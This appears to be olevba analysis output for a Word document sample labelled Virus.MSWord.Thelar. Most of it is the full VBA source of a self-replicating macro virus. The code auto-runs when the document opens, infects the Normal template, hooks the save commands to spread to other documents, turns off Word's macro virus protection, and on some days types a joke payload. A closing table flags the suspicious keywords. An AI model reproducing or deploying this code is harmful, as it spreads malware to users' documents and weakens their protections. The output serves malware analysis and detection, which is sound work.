olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Thelar
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Thelar - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Doc
End Sub
Private Sub Doc()
Dim x As Object, y As Long, z As Long, q As Object
Dim a As Byte, b As Byte, v As Object
Set q = Application.VBE.VBProjects("Normal")
On Error GoTo thing
a = q.VBComponents.Count
For b = 1 To a
If q.VBComponents(b).Name = "NewMacros" Then GoTo there
Next b
On Error GoTo newobject
q.VBComponents.Add (vbext_ct_StdModule)
q.VBComponents(a + 1).Name = "NewMacros"
there:
Set x = q.VBComponents("NewMacros").CodeModule
here:
y = x.CountOfLines
If x.Find("sóper znak", 1, 1, y + 1, 1) = True Then
Exit Sub
End If
z = Znajdz("Sub FileSave()", x, 1, y)
If z > 0 Then
x.InsertLines z + 1, "Norm"
y = y + 1
Else
x.InsertLines y + 1, "Sub FileSave()"
x.InsertLines y + 2, "Norm"
x.InsertLines y + 3, "On Error Resume Next"
x.InsertLines y + 4, "ActiveDocument.Save"
x.InsertLines y + 5, "End Sub"
y = y + 5
End If
z = Znajdz("Sub FileSaveAs()", x, 1, y)
If z > 0 Then
x.InsertLines z + 1, "Norm"
y = y + 1
Else
x.InsertLines y + 1, "Sub FileSaveAs()"
x.InsertLines y + 2, "Norm"
x.InsertLines y + 3, "On Error Resume Next"
x.InsertLines y + 4, "Dialogs(wdDialogFileSaveAs).Show"
x.InsertLines y + 5, "End Sub"
y = y + 5
End If
Set v = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule
Przepisz v, x
Exit Sub
newobject:
Set x = Application.VBE.VBProjects("Normal").VBComponents("ThisDocument").CodeModule
GoTo here
thing:
End Sub
Private Sub Norm()
Dim x As Object, z As Long, y As Long
Dim v As Object
Options.VirusProtection = False
On Error GoTo thing
Set x = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule
y = x.CountOfLines
If x.Find("sóper znak", 1, 1, y + 1, 1) = True Then
GoTo thing
End If
z = Znajdz("Sub Document_Open()", x, 1, y)
If z > 0 Then
On Error GoTo thing
x.InsertLines z + 1, "Doc"
Else
x.InsertLines y + 1, "Private Sub Document_Open()"
x.InsertLines y + 2, "Doc"
x.InsertLines y + 3, "End Sub"
End If
On Error GoTo newobject
Set v = Application.VBE.VBProjects("Normal").VBComponents("NewMacros").CodeModule
Przepisz v, x
GoTo thing
newobject:
Set v = Application.VBE.VBProjects("Normal").VBComponents("ThisDocument").CodeModule
Przepisz v, x
thing:
If Day(Date) Mod 5 = 0 Then
p = Second(Time) + Minute(Time) * 60 + Hour(Time) * 3600
On Error GoTo ding
With Selection
On Error GoTo ding
.Font.Size = 20
On Error GoTo ding
.TypeText ("And Now For Somenthing Completely Different ...")
Do While (Second(Time) + Minute(Time) * 60 + Hour(Time) * 3600 - p) < 5
Loop
For w = 1 To 5
.TypeParagraph
.TypeText ("... The Larch...")
Next w
.TypeParagraph
.TypeText ("... The Larch.")
End With
End If
ding:
End Sub
Private Sub Przepisz(Source As Object, Destination As Object)
Dim licznik As Long, ciag As String
licznik = Source.ProcCountLines("Doc", vbext_pk_Proc) + Source.ProcCountLines("Norm", vbext_pk_Proc) + Source.ProcCountLines("Przepisz", vbext_pk_Proc) + Source.ProcCountLines("Znajdz", vbext_pk_Proc)
ciag = Source.Lines(Znajdz("Sub Doc()", Source, 1, Source.CountOfLines), licznik)
Destination.InsertLines Destination.CountOfLines + 1, ciag
End Sub
Private Function Znajdz(Target As String, Object As Object, StartLine As Long, EndLine As Long) As Long
Dim CurrentLine As Long
Znajdz = 0
For CurrentLine = StartLine To EndLine
If Object.Find(Target, CurrentLine, 1, CurrentLine + 1, 1) = True Then
Znajdz = CurrentLine
Exit Function
End If
Next CurrentLine
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

